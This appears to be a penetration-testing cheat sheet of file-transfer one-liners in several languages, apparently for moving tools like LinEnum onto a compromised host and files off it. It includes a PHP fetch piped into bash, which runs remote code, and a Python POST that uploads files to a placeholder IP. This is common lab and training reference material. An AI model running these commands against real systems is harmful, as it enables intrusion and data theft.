## Python 

### Python 2 Download 
```shell
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```
### Python 3 Download

```shell
 python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## Python 3 Upload 
```shell
python3 -m uploadserver 
```

```shell
python3 -c 'import requests;requests.post("http://<ip>:8000/upload",files={"files":open("<file path>","rb")})'
```

## PHP
### File_get_contents()
```shell
php -r '$file = file_get_contents("<url>"); file_put_contents("<file name>",$file);'
```
### Fopen()
```shell
php -r 'const BUFFER = 1024; $fremote = 
fopen("<url>", "rb"); $flocal = fopen("<filename>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```
### PHP + Bash
```shell
php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Ruby 
```shell
ruby -e 'require "net/http"; File.write("<filename>", Net::HTTP.get(URI.parse("<url>")))'
```

## Perl
```shell
perl -e 'use LWP::Simple; getstore("<url>", "<filename>");'
```

## Java Script 
Make a file called `wget.js`
```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```cmd
 cscript.exe /nologo wget.js <url> <name>
```

## VBScript
Make a file called `wget.vbs`
```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs <url> <name>
```

